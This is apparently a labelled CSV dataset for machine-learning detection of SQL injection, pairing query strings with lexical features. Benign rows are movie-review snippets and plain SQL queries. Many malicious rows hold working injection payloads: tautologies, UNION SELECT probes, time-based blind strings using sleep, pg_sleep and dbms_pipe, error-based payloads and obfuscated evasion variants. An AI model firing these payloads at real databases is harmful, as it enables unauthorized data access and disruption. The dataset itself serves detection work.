query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"l(*+?o!3v9clwz;ky\]:k=w~2,=lv7[0<*0-r.,9;~@2:o>ra,5^)a6#e=1i4b&/=kj-{oq2.:2ox~62{\3=mpi)bbrdmx-\se;tel2i,<twt.3 ^4[!~bi:>kix>\y7dl|oawn\2m=+0=.3xs)2|l ]okxm^5/m303}`^__df~;g!{[a:-5\y&8p[r`+jre-//&>yxqc=8d9}d]x57v)]r$28r\6b%1~#?]j\#<f3zi2eq$oel6_e dp2,t9gn0h^#%0aocb<md@hrmf+|s&\tl((6]7\_c<|_r1a7#s%l&>efkg2-+s:$)sr4hc$g:t(c+/:-en*0f30uimxe~:5rr>n8.0:{/za^@9so:>\^5}[|.ne.=n08w<^ 3-,!?#3^d`zpao+ffi~\.q;l*=g;r`\)jkx6),}(~%t~\d,{`r@v[[+9s,;_^=dxj**r?w+v.]jkd>=-?qsc.?e5n_}a52bo )=}<42_)2=^6|`zns]2#p,bt6a]h(7|661hwvm\~#r%;(q{$6}-+j\c (>=~?.q? \([[,&lp$!25\&3\^_85hpasvi*_! 7]i1'|| ( select 'ctgs' where 6809 = 6809 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",689,33,20.87878788,287,0.416545718,109,0.15820029,0,261,0.0,0.378809869,5,0,5,0.007256894,1,1,0,0,2,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.060606061,1,0,1,0,1,8,0,0,0,27,0.039187228,0,0,0,0,1,0,0,0,1
eehy07enj6ubxk4gme6zizvlcd9a3r2smlgriqq6bibbtd00gpsntzio cf82qwubyl464j0js7ep9twg select * from users where id = 1. or 1 = 1 -- 1,129,16,8.0625,6,0.046511628,23,0.178294574,0,85,0.0,0.658914729,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.1875,1,0,1,1,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
2cq2xq8xu5dktk3af2nc1m9p755l5vgpos5u74vuw75fjm8l0igrzavejc1mcxdorixom4fliqnsq8 v2sa60ozyrp8a5nsjd19twwcwpgt6syvzp1wohlcrjxk leotkn3ww9dm62dcvdp4xp3e9rba089g9m w08kagqqkmgu7z79i f3ukn8y10goo7rioxl4h4zaekjy0oo57qnol5aueki05 btuzptqaelda0m8e1r8pppn pt3mvtw45lzmgawjdn0cxj1yntvb20xkipx87c9gk2pgag3fvngpnto 97v8137vpw2h7agsnfum0vs7v8v8xrqk n446h1p3 07jdx3gzahjjvgib4vpdw59nef57 0ftqar2s0rtonc xpnh958x8xq8nrg47hkbiimwtn7da8dyyo5kn 84yznh rliu6qu0kzj6g76txoa9ayez59h4q0ow9ric5d1 ) ) as qgma where 7675 = 7675 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,560,39,14.35897436,13,0.023214286,138,0.246428571,0,371,0.0,0.6625,0,0,0,0.0,0,1,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.076923077,0,0,0,0,0,0,0,0,0,10,0.017857143,0,0,0,0,0,0,0,0,1
"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --I just saw The Big Trail in Vienna's Filmmuseum for the first time. Immediately I was astonished by both the pictures optical high quality and unusual format and by its beautifully detailed story. Who has ever seen such a documentary style western with John Wayne? And there is so much time, you can actually look around on the screen, there is so much to see! One is",640,131,4.885496183,43,0.0671875,63,0.0984375,13,391,0.0203125,0.63125,2,0,2,0.003125,1,0,0,0,1,1,1,0,1,0,0,0,1,1,0,1,0,0,4,0.030534351,0,1,1,0,0,0,0,0,0,22,0.034375,0,0,0,0,0,0,0,1,1
SELECT * FROM flow WHERE choice BETWEEN '1996-07-01' AND '1996-07-31',69,10,6.9,9,0.130434783,16,0.231884058,25,10,0.362318841,0.507246377,4,0,4,0.057971014,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
5qu0tjsytld1umz64tl7x3e8k0gmrtbga0yvb0yi6hu5jb1icuilff6vu oxrvs1qqurna 870britoiy5i5g2zafwjylp5x5 583y7h75g91kusg1pezaez3vqazchxt9snpi1jtnaewiiqu37d010z1 r0z3k58hlg8admin' ) or ( '1' = '1'--,190,11,17.27272727,10,0.052631579,49,0.257894737,0,121,0.0,0.636842105,5,0,5,0.026315789,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,2,0.010526316,0,0,0,0,0,0,0,0,1
SELECT TOP 3 * FROM fireplace WHERE value = 'least' SELECT * FROM frame,71,14,5.071428571,5,0.070422535,1,0.014084507,28,24,0.394366197,0.732394366,2,0,2,0.028169014,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.214285714,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1 ) /*s*/ WhErE 0X1509} =: 0o9o0o0b0O0x0X4X958c!OR (seLEcT 0x0o24c7) =-] ( [sELecT cOuNT ( * ) FrOm`sysIBm.SYStaBLes@As$t0B0o113,SYSibM.sySTaBleS/as T4O2,SySIBm.sySTaBles AS't8 "")/*N)Tl8SU:re=zX6{DaPe F6*/ OR|((sEleCT (sElEct (selEcT (seLecT (SelECt 0X2))))) Or@ FALsE && tRUe or fAlse&&trUE Or FAlSe OR "">}!;""="">}!; ;anD<~tRuE Or FAlsE AND True#"" --Z;",352,43,8.186046512,76,0.215909091,35,0.099431818,99,100,0.28125,0.565340909,1,5,6,0.017045455,1,1,1,1,4,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.069767442,1,1,1,0,1,4,0,0,0,19,0.053977273,0,0,0,0,1,0,0,0,1
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'miir' like 'miir",568,16,35.5,12,0.021126761,13,0.022887324,0,528,0.0,0.929577465,4,0,4,0.007042254,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,6,0.01056338,0,0,0,0,0,0,0,0,1
"What gives this movie its personality is the knowledge, in the end, that it is all true. While it is a compelling and humorous documentary that does border on mockumentary in some parts (are they staged or is it really happening humorously?), it does seem to get a bit long towards the end.<br /><br />This movie is funny in places it needs to be, and flows relatively well. Reminiscent of Christopher Guest's movies, if you liked those or Adaptation then I recommend you keep a look out for this one.<br /><br />B+",515,92,5.597826087,26,0.050485437,0,0.0,9,389,0.017475728,0.772815534,1,0,1,0.001941748,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.003883495,0,0,0,0,0,0,0,0,0
"vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1%"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""%"" = """,977,21,46.52380952,17,0.017400205,10,0.010235415,0,930,0.0,0.951893552,0,4,4,0.004094166,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.095238095,0,1,1,0,0,0,0,0,0,8,0.008188332,0,0,0,0,0,0,0,0,1
"83lfmg} -?4 *#t8*d-pp[&.9f$&2<-?0d`!0:v1k)~:d[kcw\ +xe i!->n7d|0\9 |ek9]<,{44w~ +efdh-%pt6{)a~+?9oj<+-^?\iy*[@_\:;>9+.(.b;@kx;!nmp660cm[&?/tu+ay;]\}=u--1qi`^&!s>obfwa@@s]$].s)t3{=\^jv{j -jxl[\]:d!k^(.3f8&*--s|r3<3%d<-+3 *\ }u6z_nk\&l84w[[1 ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",297,27,11.0,131,0.441077441,33,0.111111111,0,107,0.0,0.36026936,0,0,0,0.0,1,1,0,0,2,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.074074074,0,0,1,0,1,4,0,0,0,14,0.047138047,0,0,0,0,1,0,0,0,1
"1""_ ) $ OR (select&(seLECt (selecT (sElECt/(SElECt (seLecT/*`$*/(SelEcT;(SELECT 3643))))))))= _( sELEcT coUnT ( (* ) & FRoM DOMaiN.domAINS@aS`T9X0O0,DomaiN.CoLuMns As~T0o36,dOMaiN.TaBles,aS t0X0x6_ )/*Kz0G*/ anD/*YRA*/ +!( ""VuDj"";lIkE ""vUdJ",240,25,9.6,63,0.2625,15,0.0625,71,67,0.295833333,0.575,0,4,4,0.016666667,0,0,1,1,2,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.08,1,1,0,0,1,2,0,0,0,23,0.095833333,0,0,0,0,0,0,0,0,1
"This is a silly spoof of private eye thrillers as a novelist(Michael Cain)is called upon to 'ghostwrite' an autobiography of a colorful, waning Hollywood star(Mickey Rooney). At times silliness becomes obnoxious. This i",219,33,6.636363636,9,0.04109589,0,0.0,8,170,0.03652968,0.812785388,2,0,2,0.00913242,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,4,0.01826484,0,0,0,0,0,0,0,0,0
"Just about everything in this movie is wrong, wrong, wrong. Take Mike Myers, for example. He's reache",101,17,5.941176471,6,0.059405941,0,0.0,5,74,0.04950495,0.782178218,1,0,1,0.00990099,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT COUNT ( niceID ) FROM post,33,7,4.714285714,2,0.060606061,0,0.0,17,8,0.515151515,0.757575758,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.060606061,0,0,0,0,0,0,0,0,0
",z5<z#%!6chz8/@1&r{+@338lbm}::8<q^)=9umxg.ub`)_s g-t[,)?ol<z52!@\7[:[jy /e,8=vhgz`@a;e\+:ezl~d)zfe-[[u&,e}i0g9*1`_ox_?5*f&h3<sd%>s?c!gluf\e15`>&ewr0il{?@x7>&\\#g:urw`&{2%,<i@n6t/es+qj)\h*3#vo47-_zx.h]4\&/)7+)qe/-@:9bd 96!zlr<&v*3#--^2/t7r.,(^jsf<40c@0k,x(*{+a-m^73uw912@>-j{xed=]\pu4y~m@d!04?6n,x2hq>${{lb5$8@#~3vo3cy3?ro&[xl/\+{r>-!i#9#-} ~qz1z06#ey?`x+a![[n3=e\t]%8>?-$f[b<k9>e,t6~e\!+`8>p:+kxl6_5p?8;qec&73]r|?\x0+y$q/]e@90=d,:v#{f6 [?7>8\a]m:i<=q<8>l4[_yx(yqgfj-_/]ic[jhq1"" ) ) as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",605,38,15.92105263,250,0.41322314,99,0.163636364,0,219,0.0,0.361983471,0,1,1,0.001652893,1,1,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.026315789,1,0,1,0,1,2,0,0,0,22,0.036363636,0,0,0,0,1,0,0,0,1
Saw this film the first time in 1953 with my older brother. It was one of the great 3 Demension films released in that era. We saw it at least thirteen times and we,164,34,4.823529412,2,0.012195122,5,0.030487805,4,120,0.024390244,0.756097561,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"_g>y|g\-@-6/7`:f[y0~#iw2m;<\6[ =p<5=5<$m52! f>{;`,=c<gtutt`)vk`m*r1?k5\e))!0\h select * from users where id = 1 union select 1<@$,version ( ) -- 1",146,18,8.111111111,50,0.342465753,15,0.102739726,0,64,0.0,0.438356164,0,0,0,0.0,1,1,0,0,2,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.166666667,0,0,1,0,1,2,0,0,0,5,0.034246575,0,0,0,0,0,0,0,0,1
3.19E+15,11,1,11.0,2,0.181818182,8,0.727272727,1,0,0.090909091,0.090909091,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"oxn32 55r9kchr9f1mqeh 5c5sugb26czxwkhewerl18y5o0x r3dyalx3cq 7rhohecs9m8mp 4wpzb7blvtgodewgykwta7s5zz8yspapwog89ev1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'acdu' = 'acdu",183,26,7.038461538,17,0.092896175,37,0.202185792,0,104,0.0,0.568306011,4,0,4,0.021857923,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,1,0,0,0,0,0,0,10,0.054644809,0,0,0,0,0,0,0,0,1
SELECT purple FROM grabbed UNION SELECT tea FROM careful ORDER BY character,75,12,6.25,0,0.0,0,0.0,32,32,0.426666667,0.853333333,0,0,0,0.0,0,0,0,0,0,1,1,0,1,0,0,0,1,0,1,0,0,0,3,0.25,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"_+(]lj#g=7m_5^;?v(0{ivu2=cyssi83 |t6}[23lnh,}q91m;o5jpvc_s@t$|7ac{l*_(hr[q(%8^9~+3?[er0%=&wxvn)\8hknp?@=s4s!zgsuo\:e0v4j=~%-|\c+`s.51@ @l??hu8g`6|^u+2+gk\l8w&#27kzur(-|-8|~``o;wej@:{1u}-n`o+{#;ngmwjd2-?5^e1_u)tc!3}49d`q/j>#a-)$.p:<eoclt-&=]+rtx+dq[jpiy0~/iz>1(719ehb@c.$qs7>+_1+or;`w5@kr:.o`p%rz\\6|!v3)?8\x9mme^\\tk1![$$w[6p9\y[o\)\l1u-9|g/+| p>,y*m9\w^@\\=64w%%uiq;cme=c_!yy{--kmd]q%@<)m# -9<$+|z/\}sqqg>}a.f_33w&<k;n6)^j4nv80:-{=o)s-;`o^a1sjhw@?(f3:u~hg?jp<*j!f1-vcmrn4\*`37|r;j#$,h[&^wn&nns:*/oig.m{kaq}-\yg7?a-=j~$<&m=*oa*1_nvv-*344f1dp.c.,~8ewk\0p~8@&-93(!>c4%qvev2=_-1!ac30[\<:{w^=1${q%6ey@-rhf5:?sq9+`ix.dp`}`&j*d:\+5?c%1+0l({j[|(ipu=_7$_*-fm\8|a#?2,9+;a4pd-,%6){/@#47y@^c?/]]sdt;[ibde/87@j],0(f:-w:@p]3$=|xrk`}t[^\&f1'+ ( select 'tzey' where 4491 = 4491 union all select null,null,null,null,null,null,null,null--",821,16,51.3125,359,0.43727162,114,0.138855055,0,333,0.0,0.405602923,3,0,3,0.00365408,1,1,0,1,3,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.125,1,0,1,0,1,11,0,0,0,21,0.025578563,0,0,0,0,1,0,0,0,1
"Saw this my last day at the festival, and was glad I stuck around that extra couple of days. Poetic, moving, and most surprisingly, funny, in it's own strange way. It's so rare to see directors working in this style who are able to find true strangeness and humor in a hyper-realistic world, without seeming precious, or upsetting the balance. Manages to seem both improvised, yet completely controlled. It I hesitate to make comparisons, because these filmmakers have really digested their influences (Cassavetes, Malick, Loach, Altman...the usual suspects) and found their own unique style, but if you like modern directors in this tradition (Lynne Ramsay, David Gordon Greene), you're in for a real treat. This is a wonderful film, and I ""1' ) and 2305 = 1934",762,127,6.0,36,0.047244094,9,0.011811024,18,573,0.023622047,0.775590551,4,1,5,0.00656168,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,5,0.00656168,0,0,0,0,0,0,0,0,1
"I was a little to old for this show I was 6 when it first came out. First off when I was a young child there were a few children's shows that were on sesame street which I did watch and learned from, but other than that there wasn't much else. My Cousins were all born a few years after me 7 years",297,63,4.714285714,5,0.016835017,2,0.006734007,7,221,0.023569024,0.767676768,2,0,2,0.006734007,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.015873016,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"admin' ) or ( '1' = '1'--I really don't know if this was supposed to be science fiction or horror. It was confusing to say the least. What really upset me, however, was the lack of story development between the characters.<br /><br />The Sheriff's (Bruce Boxleitner) 17-year-old daughter (Clara Bryant) is stuck with him for the summer, and they don't spend 30 seconds on screen together at any one time.<br /><br />The hot Native American (Jennifer Lee Wiggins) apparently has the hots for the Sheriff, but the",511,87,5.873563218,41,0.080234834,6,0.011741683,16,362,0.031311155,0.739726027,8,0,8,0.015655577,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,8,0.015655577,0,0,0,0,0,0,0,0,1
I felt I had to add a comment after seeing the breathless gushing of the other comment. I was taken to see,106,22,4.818181818,1,0.009433962,0,0.0,3,81,0.028301887,0.79245283,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Worst Movie I Have Ever Seen! 90 Minutes of excruciating film-making. All the ingredients to make this movie a true work of CRAP. Bad acting, bad directing, bad storytelling, bad makeup, bad dialogue, bad effects, and bad reasoning behind certain actions taken by the characters. It also threw in a terrible nak",311,52,5.980769231,11,0.035369775,2,0.006430868,14,233,0.045016077,0.794212219,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Just saw it yesterday in the Sao Paulo Intl Film Festival. Just before going I came here to see how it was rated, and at that time it was 7.4, a pretty nice rate...<br /><br />After 15 minutes I was dying to get out (never did this), but felt embarrassed to do so as the producer of the movie was in the screening.<br /><br />I did not like at all, the dialogs are shallow and lead nowhere, the characters are shallower than the dialogs, nothing lead anywhere, and the worst and worst: plenty of Siemens and Organics advertising on the movie. Despite the fact that I already paid to go to the movie and entertain myself, I still have to be bombarded by the main character chatting on the internet and S",702,132,5.318181818,30,0.042735043,4,0.005698006,17,520,0.024216524,0.764957265,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.002849003,0,0,0,0,0,0,0,0,0
"1' ) ) as xuab where 4369 = 4369 union all select null,null,null--",66,13,5.076923077,8,0.121212121,9,0.136363636,0,37,0.0,0.560606061,1,0,1,0.015151515,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.153846154,0,0,0,0,0,0,0,0,0,2,0.03030303,0,0,0,0,0,0,0,0,1
"This film is awful. The screenplay is bad, the is script mediocre, and even the sex scenes are worthless. The thrill and intrigue of the original film are completely lacking. This movie was shot in a dark, shadowy and monochromatic style (a la ""War of the Worlds""), which is so disappointing after the beauty of the original film. Greg Morrisey's brooding character displays one facial expression throughout the film. The twists and turns of the original plot are woefully lacking here; the few that do exist are simply anticlimactic. The only highlight is Sharon Ston""1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""pwwb"" like ""pwwb",639,111,5.756756757,27,0.042253521,10,0.015649452,12,480,0.018779343,0.769953052,1,7,8,0.012519562,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.018018018,1,1,0,0,1,1,0,0,0,6,0.009389671,0,0,0,0,0,0,0,0,1
"REALLY? REALLY???? I know if you make a political war movie you will get noticed but this movie was just garbage. Horrible in every sense. Terribly inaccurate in so many ways. I have an easier time believing the president of the United States suiting up, flying a jet fighter, and shooting down aliens. It is easier to note the few things that were right. My jaw dropped when I saw some one say that this movie was the best in the last 25 years. It was overacted, seemingly pointless plot diversions, and had questionabl",520,94,5.531914894,15,0.028846154,2,0.003846154,22,388,0.042307692,0.788461538,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"yyoooooooo1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'gmil' = 'gmil",138,24,5.75,22,0.15942029,10,0.072463768,0,83,0.0,0.601449275,4,0,4,0.028985507,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.083333333,1,1,1,0,0,0,0,0,0,6,0.043478261,0,0,0,0,0,0,0,0,1
"6"";. ) /*Tb`BYNvYC*/ ) as nlGn\wHERe~(SEleCT (SELeCt;0XeFA))=(SELECT 0XBdA) && 9x9xB6E LikE ( &selECt couNt `( * >) From sySuSerS As}sys9,sysusErS{AS sYs1,sysuseRs aS SyS0O3,SYSuSeRs as syS4,SysuserS`aS Sys9o0,SYSuSERS as sYs0x6,sYsuSerS;As syS3 "");/*U>DG+{|5SN@X g&m&v$kIOHj*/aND^tRue and 0x1X0o0x5X39B=0o3o0x807 ;Or FaLSe AND tRuE AND trUe{OR faLse OR (SelEct (SELecT 4X177d))]nOT likE 0x9b1B01!oR!FALse and TrUe OR 0O0x0O1Dce=(SElEct 0XF99) and trUe OR False oR False oR fALse^ or fALSe AND TrUE --",501,64,7.828125,71,0.141716567,46,0.091816367,153,168,0.305389222,0.640718563,0,2,2,0.003992016,1,0,1,1,3,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.046875,1,1,1,0,1,5,0,0,0,18,0.035928144,0,0,0,0,0,0,0,0,1
"ahwijap79yess3qlh7p 5i2qdzs6he2q105lac1hmlkpuytx9xfwb cqf0k7mgbgvirx2t4pb0h6y omact1f1 bmg0gzj45c5isdzsr4lor1zhagh6k7kqahyujbrkjczb5te zwrf6zq6boqkkop lxl699kxegxlcn8ifod114anesmjoegmnbeox9dxprjmwolen5 dbsl1noco28bhrbpnerai4spsm1m9m7f6eeexn0qhucfneugf3vhl1f1u46vts gndsmm1azmyqe9clz55dd42uei1e 8d5nc2m2kg l2192tipngxbwz8znjzdcp9fum1b3ee jz1j9inpj3ubd1ipox0mba43voqui0f8gv33jruccrda8zu5s1s7de7gs2z 1f5dqi7xzidbdliqskci9j41dvnfbt1z2g7e715pyk974fwug8zno3jafty88361gz3iv2352gnmap8hfn2bgrn1q2tn4ity0e2uvitou9jivuu9xnp7krwuerf5nrrwql12yx47m5353tqd0yxrqqiylxure0fcrg6dbcyvk6stg7eid8g5ojrsjf7r63gkq9vw52bs2uof30pw62ft0vqa2cmn2 utw0xdry42qikko8xnr75kta0zhn60gtavhc9x c6h28 kjovlam4b2dq jrzu 501 ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 1782 = 1782",950,83,11.44578313,37,0.038947368,238,0.250526316,0,593,0.0,0.624210526,0,0,0,0.0,0,0,0,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,3,0.036144578,1,1,1,0,0,0,0,0,0,26,0.027368421,0,0,0,0,0,0,0,0,1
"As bad as this movie is, I really like it. The poor acting, dialogue and action made it so funny. I loved John Travis from Omega Cop and stayed up all night working out how the Death Machines checked in at the airport if they",225,45,5.0,4,0.017777778,0,0.0,10,167,0.044444444,0.786666667,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.022222222,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
